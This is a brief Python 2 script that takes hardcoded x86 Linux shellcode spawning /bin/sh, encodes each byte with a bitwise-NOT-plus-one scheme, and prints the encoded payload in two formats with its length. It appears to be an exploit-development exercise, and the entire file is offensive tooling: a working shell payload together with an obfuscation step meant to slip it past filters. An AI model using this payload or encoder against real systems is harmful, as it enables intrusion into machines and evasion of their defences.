

encoded=""
encoded2=""

shellcode =("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00")

for c in bytearray(shellcode):
	e = ~(c+1)
	encoded += "\\x"
	encoded += "%02x" % (e & 0xff)

	encoded2 += ",0x"
	encoded2 += "%02x" % (e & 0xff)

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))